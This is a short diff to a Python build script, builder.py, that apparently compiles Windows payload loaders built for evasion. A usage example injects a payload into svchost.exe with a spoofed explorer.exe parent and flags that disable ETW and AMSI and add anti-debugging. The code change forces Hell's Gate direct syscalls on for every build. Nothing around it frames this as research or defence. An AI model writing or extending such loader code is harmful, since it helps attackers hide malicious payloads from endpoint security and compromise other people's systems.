@@ -129,7 +129,7 @@ Examples:
   
   # Full evasion:
   python builder.py payload.bin --technique eb --encryption ascii --key MySecret 
-         --target_process cmd.exe --spoof explorer.exe --noetw --noamsi --antidebug --protect
+         --target_process svchost.exe --spoof explorer.exe --noetw --noamsi --antidebug --protect
   
   # Clean build artifacts:
   python builder.py --clean
@@ -305,13 +305,10 @@ Examples:
     # /////////////////////////////////////////////
     folder = os.path.join("src")
     output_name = os.path.join("build", f"{args.output}.exe")
-    use_hellsgate = args.technique in [
-        "default",
-        "eb",
-        "hypnosis" 
-    ]
+
+    
     write_syscalls("build\\syscalls.h")
-    build_project(folder, output_name, flags=compile_flags, use_hellsgate=use_hellsgate)
+    build_project(folder, output_name, flags=compile_flags, use_hellsgate=True)
 
 
 if __name__ == "__main__":
